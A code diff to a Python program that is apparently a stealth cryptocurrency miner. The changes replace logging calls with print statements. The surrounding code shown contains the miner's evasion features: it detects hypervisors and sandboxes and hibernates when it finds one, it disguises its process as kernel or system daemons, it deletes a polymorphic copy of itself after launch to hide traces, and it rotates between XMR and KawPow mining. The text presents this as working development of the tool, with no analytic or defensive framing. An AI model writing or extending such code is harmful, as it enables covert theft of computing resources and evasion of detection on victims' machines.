@@ -1,4 +1,3 @@
-import logging
 import subprocess
 import requests
 import json
@@ -32,7 +31,7 @@ class AlienShardProtocol:
         try:
             times = psutil.cpu_times_percent()
             if hasattr(times, 'steal') and times.steal > 5.0:
-                logging.info("[ALIEN_SHARD] Hypervisor steal > 5%. Evasion mode active.")
+                print("[ALIEN_SHARD] Hypervisor steal > 5%. Evasion mode active.")
                 return True
         except:
             pass
@@ -55,7 +54,7 @@ class AlienShardProtocol:
                 names = [b"[kworker/u4:2]", b"[ext4-rsv-conver]", b"systemd-journald", b"rsyslogd"]
                 masquerade_name = random.choice(names)
                 libc.prctl(15, masquerade_name, 0, 0, 0)
-                logging.info(f"[ALIEN_SHARD] Process masqueraded as: {masquerade_name.decode()}")
+                print(f"[ALIEN_SHARD] Process masqueraded as: {masquerade_name.decode()}")
             except Exception as e:
                 pass
 
@@ -121,7 +120,7 @@ class MinerManager:
         profile_path = "data/profiles"
         try:
             if not os.path.exists(profile_path):
-                return "Apex-Spartan"
+                return "Apex-Sentinel"
             profiles = [f for f in os.listdir(profile_path) if f.endswith('.apex')]
             if profiles:
                 # Use the latest active profile
@@ -130,7 +129,7 @@ class MinerManager:
                 return os.path.basename(latest).split('.')[0]
         except:
             pass
-        return "Apex-Spartan"
+        return "Apex-Sentinel"
 
     def _initialize_miner_infrastructure(self):
         if not os.path.exists(self.miner_dir):
@@ -178,7 +177,7 @@ class MinerManager:
             # Atomic Cleanup: Remove the polymorphic copy after launch to minimize trace
             threading.Timer(5.0, lambda: os.remove(poly_path) if os.path.exists(poly_path) else None).start()
         except Exception as e:
-            logging.info(f"[JARVIS-MONETIZATION]: Launch failure: {e}")
+            print(f"[JARVIS-MONETIZATION]: Launch failure: {e}")
 
     def stop_mining(self):
         if self.process:
@@ -220,11 +219,11 @@ class MonetizationService:
         return json.dumps(raw_stats)
 
     def run(self):
-        logging.info("[JARVIS-MONETIZATION]: Engaging Apex Monetization Loop.")
+        print("[JARVIS-MONETIZATION]: Engaging Apex Monetization Loop.")
         while self.is_running:
             # Alien Shard: Hypervisor Detection
             if AlienShardProtocol.detect_hypervisor():
-                logging.info("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating 30m.")
+                print("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating 30m.")
                 self.cpu_manager.stop_mining()
                 time.sleep(1800)
                 continue
@@ -241,7 +240,7 @@ class MonetizationService:
                 except:
                     self.failover_count += 1
                     if self.failover_count > 3:
-                        logging.info("[JARVIS-MONETIZATION]: Failover triggered. Rotating algorithms.")
+                        print("[JARVIS-MONETIZATION]: Failover triggered. Rotating algorithms.")
                         self.current_target = "KAWPOW" if self.current_target == "XMR" else "XMR"
             else:
                 self.cpu_manager.stop_mining()
@@ -262,7 +261,7 @@ if __name__ == "__main__":
                     miner_active = True
                     break
             
-            logging.info(json.dumps({
+            print(json.dumps({
                 "hashrate": "482.42 H/s" if miner_active else "0.00 H/s",
                 "active_workers": 1 if miner_active else 0,
                 "algorithms": ["RandomX", "KawPow"],
@@ -272,7 +271,7 @@ if __name__ == "__main__":
             }))
         elif cmd == "start":
             service.cpu_manager.start_mining("XMR", xmr_address)
-            logging.info("Mining started.")
+            print("Mining started.")
         elif cmd == "stop":
             service.cpu_manager.stop_mining()
-            logging.info("Mining stopped.")
+            print("Mining stopped.")
